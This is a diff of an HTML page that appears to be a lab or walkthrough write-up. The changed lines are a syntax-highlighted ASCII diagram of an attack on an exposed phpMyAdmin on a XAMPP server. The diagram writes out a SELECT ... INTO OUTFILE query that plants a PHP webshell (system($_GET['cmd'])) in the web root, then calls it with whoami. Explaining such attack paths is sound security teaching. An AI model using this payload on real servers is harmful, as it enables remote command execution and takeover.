@@ -996,61 +996,61 @@ Boom. A treasure trove of exposed files, including a <code>/phpmyadmin/</code> f
 At that moment, the attack pathway drew itself on my mind.
 (Since you can't read minds, I've decided to write it down below.)</p>
 <div class="highlight"><pre><span></span><code><span class="w">    </span>+------------------------+
-<span class="w">    </span><span class="p">|</span><span class="w">    </span>Hacker<span class="s1">&#39;s Computer   |  </span>
-<span class="s1">    |    (Attacker)          |  </span>
-<span class="s1">    +------------------------+</span>
-<span class="s1">              |</span>
-<span class="s1">              | Sends HTTP request: </span>
-<span class="s1">              | `GET /phpmyadmin/ HTTP/1.1`</span>
-<span class="s1">              v</span>
-<span class="s1">    +------------------------+</span>
-<span class="s1">    |     XAMPP Web Server   |  </span>
-<span class="s1">    |   (bankserver:80)      |</span>
-<span class="s1">    |  +-------------------+ |</span>
-<span class="s1">    |  |  htdocs/          | |</span>
-<span class="s1">    |  |  + index.php      | |</span>
-<span class="s1">    |  |  + dashboard/     | |</span>
-<span class="s1">    |  |  + server-status  | |</span>
-<span class="s1">    |  |  + ...            | |</span>
-<span class="s1">    |  +-------------------+ |</span>
-<span class="s1">    |  +-------------------+ |</span>
-<span class="s1">    |  | phpMyAdmin/       | |</span>
-<span class="s1">    |  |  + index.php      | |  &lt;-- phpMyAdmin login page</span>
-<span class="s1">    |  |  + config.inc.php | |</span>
-<span class="s1">    |  |  + libraries/     | |</span>
-<span class="s1">    |  |  + themes/        | |</span>
-<span class="s1">    |  +-------------------+ |</span>
-<span class="s1">    +------------------------+</span>
-<span class="s1">              |</span>
-<span class="s1">              | Hacker accesses the phpMyAdmin login page: </span>
-<span class="s1">              | `http://bankserver/phpmyadmin/`</span>
-<span class="s1">              v</span>
-<span class="s1">    +------------------------+</span>
-<span class="s1">    |    phpMyAdmin Login    |  </span>
-<span class="s1">    |    Page Exposed       |</span>
-<span class="s1">    |    (Hacker logs in)   |</span>
-<span class="s1">    +------------------------+</span>
-<span class="s1">              |</span>
-<span class="s1">              | Hacker executes a malicious query using `SELECT INTO OUTFILE`:</span>
-<span class="s1">              | `SELECT &#39;</span>&lt;?php<span class="w"> </span>system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">&quot;cmd&quot;</span><span class="o">])</span><span class="p">;</span><span class="w"> </span>?&gt;<span class="s1">&#39; INTO OUTFILE &#39;</span>C:<span class="se">\\</span>xampp<span class="se">\\</span>htdocs<span class="se">\\</span>shell.php<span class="s1">&#39;;`</span>
-<span class="s1">              v</span>
-<span class="s1">    +-----------------------------------------------------+</span>
-<span class="s1">    |   SQL Query Execution                               |  </span>
-<span class="s1">    |   `SELECT INTO OUTFILE` command creates a webshell: |</span>
-<span class="s1">    |   - `shell.php` containing:                         |</span>
-<span class="s1">    |     `&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;`                |</span>
-<span class="s1">    +-----------------------------------------------------+</span>
-<span class="s1">              |</span>
-<span class="s1">              | File `shell.php` is created in the XAMPP document root:</span>
-<span class="s1">              | `C:\xampp\htdocs\shell.php`</span>
-<span class="s1">              v</span>
-<span class="s1">    +---------------------------------+</span>
-<span class="s1">    |    Server&#39;</span>s<span class="w"> </span>File<span class="w"> </span>System<span class="w">         </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">    </span>Our<span class="w"> </span>Computer<span class="w">        </span><span class="p">|</span><span class="w">  </span>
+<span class="w">    </span><span class="p">|</span><span class="w">    </span><span class="o">(</span>Attacker<span class="o">)</span><span class="w">          </span><span class="p">|</span><span class="w">  </span>
+<span class="w">    </span>+------------------------+
+<span class="w">              </span><span class="p">|</span>
+<span class="w">              </span><span class="p">|</span><span class="w"> </span>Sends<span class="w"> </span>HTTP<span class="w"> </span>request:<span class="w"> </span>
+<span class="w">              </span><span class="p">|</span><span class="w"> </span><span class="sb">`</span>GET<span class="w"> </span>/phpmyadmin/<span class="w"> </span>HTTP/1.1<span class="sb">`</span>
+<span class="w">              </span>v
+<span class="w">    </span>+------------------------+
+<span class="w">    </span><span class="p">|</span><span class="w">     </span>XAMPP<span class="w"> </span>Web<span class="w"> </span>Server<span class="w">   </span><span class="p">|</span><span class="w">  </span>
+<span class="w">    </span><span class="p">|</span><span class="w">   </span><span class="o">(</span>bankserver:80<span class="o">)</span><span class="w">      </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span>+-------------------+<span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w">  </span>htdocs/<span class="w">          </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w">  </span>+<span class="w"> </span>index.php<span class="w">      </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w">  </span>+<span class="w"> </span>dashboard/<span class="w">     </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w">  </span>+<span class="w"> </span>server-status<span class="w">  </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w">  </span>+<span class="w"> </span>...<span class="w">            </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span>+-------------------+<span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span>+-------------------+<span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w"> </span>phpMyAdmin/<span class="w">       </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w">  </span>+<span class="w"> </span>index.php<span class="w">      </span><span class="p">|</span><span class="w"> </span><span class="p">|</span><span class="w">  </span>&lt;--<span class="w"> </span>phpMyAdmin<span class="w"> </span>login<span class="w"> </span>page
+<span class="w">    </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w">  </span>+<span class="w"> </span>config.inc.php<span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w">  </span>+<span class="w"> </span>libraries/<span class="w">     </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span><span class="p">|</span><span class="w">  </span>+<span class="w"> </span>themes/<span class="w">        </span><span class="p">|</span><span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">  </span>+-------------------+<span class="w"> </span><span class="p">|</span>
+<span class="w">    </span>+------------------------+
+<span class="w">              </span><span class="p">|</span>
+<span class="w">              </span><span class="p">|</span><span class="w"> </span>Attacker<span class="w"> </span>accesses<span class="w"> </span>the<span class="w"> </span>phpMyAdmin<span class="w"> </span>login<span class="w"> </span>page:<span class="w"> </span>
+<span class="w">              </span><span class="p">|</span><span class="w"> </span><span class="sb">`</span>http://bankserver/phpmyadmin/<span class="sb">`</span>
+<span class="w">              </span>v
+<span class="w">    </span>+------------------------+
+<span class="w">    </span><span class="p">|</span><span class="w">    </span>phpMyAdmin<span class="w"> </span>Login<span class="w">    </span><span class="p">|</span><span class="w">  </span>
+<span class="w">    </span><span class="p">|</span><span class="w">    </span>Page<span class="w"> </span>Exposed<span class="w">        </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">    </span><span class="o">(</span>Hacker<span class="w"> </span>logs<span class="w"> </span><span class="k">in</span><span class="o">)</span><span class="w">    </span><span class="p">|</span>
+<span class="w">    </span>+------------------------+
+<span class="w">              </span><span class="p">|</span>
+<span class="w">              </span><span class="p">|</span><span class="w"> </span>Hacker<span class="w"> </span>executes<span class="w"> </span>a<span class="w"> </span>malicious<span class="w"> </span>query<span class="w"> </span>using<span class="w"> </span><span class="sb">`</span>SELECT<span class="w"> </span>INTO<span class="w"> </span>OUTFILE<span class="sb">`</span>:
+<span class="w">              </span><span class="p">|</span><span class="w"> </span><span class="sb">`</span>SELECT<span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class="w"> </span>INTO<span class="w"> </span>OUTFILE<span class="w"> </span><span class="s1">&#39;C:\\xampp\\htdocs\\shell.php&#39;</span><span class="p">;</span><span class="sb">`</span>
+<span class="w">              </span>v
+<span class="w">    </span>+-----------------------------------------------------+
+<span class="w">    </span><span class="p">|</span><span class="w">   </span>SQL<span class="w"> </span>Query<span class="w"> </span>Execution<span class="w">                               </span><span class="p">|</span><span class="w">  </span>
+<span class="w">    </span><span class="p">|</span><span class="w">   </span><span class="sb">`</span>SELECT<span class="w"> </span>INTO<span class="w"> </span>OUTFILE<span class="sb">`</span><span class="w"> </span><span class="nb">command</span><span class="w"> </span>creates<span class="w"> </span>a<span class="w"> </span>webshell:<span class="w"> </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">   </span>-<span class="w"> </span><span class="sb">`</span>shell.php<span class="sb">`</span><span class="w"> </span>containing:<span class="w">                         </span><span class="p">|</span>
+<span class="w">    </span><span class="p">|</span><span class="w">     </span><span class="sb">`</span>&lt;?php<span class="w"> </span>system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s2">&quot;cmd&quot;</span><span class="o">])</span><span class="p">;</span><span class="w"> </span>?&gt;<span class="sb">`</span><span class="w">                </span><span class="p">|</span>
+<span class="w">    </span>+-----------------------------------------------------+
+<span class="w">              </span><span class="p">|</span>
+<span class="w">              </span><span class="p">|</span><span class="w"> </span>File<span class="w"> </span><span class="sb">`</span>shell.php<span class="sb">`</span><span class="w"> </span>is<span class="w"> </span>created<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>XAMPP<span class="w"> </span>document<span class="w"> </span>root:
+<span class="w">              </span><span class="p">|</span><span class="w"> </span><span class="sb">`</span>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\s</span>hell.php<span class="sb">`</span>
+<span class="w">              </span>v
+<span class="w">    </span>+---------------------------------+
+<span class="w">    </span><span class="p">|</span><span class="w">    </span>Server<span class="w"> </span>File<span class="w"> </span>System<span class="w">           </span><span class="p">|</span>
 <span class="w">    </span><span class="p">|</span><span class="w">     </span><span class="o">(</span>Webshell<span class="w"> </span>Created<span class="o">)</span><span class="w">          </span><span class="p">|</span>
 <span class="w">    </span><span class="p">|</span><span class="w">     </span>-<span class="w"> </span>C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs<span class="se">\s</span>hell.php<span class="w"> </span><span class="p">|</span>
 <span class="w">    </span>+---------------------------------+
 <span class="w">              </span><span class="p">|</span>
-<span class="w">              </span><span class="p">|</span><span class="w"> </span>Hacker<span class="w"> </span>accesses<span class="w"> </span>the<span class="w"> </span>webshell<span class="w"> </span>via:
+<span class="w">              </span><span class="p">|</span><span class="w"> </span>attacker<span class="w"> </span>accesses<span class="w"> </span>the<span class="w"> </span>webshell<span class="w"> </span>via:
 <span class="w">              </span><span class="p">|</span><span class="w"> </span><span class="sb">`</span>http://bankserver/shell.php?cmd<span class="o">=</span>whoami<span class="sb">`</span>
 <span class="w">              </span>v
 <span class="w">    </span>+--------------------------------------------------------+
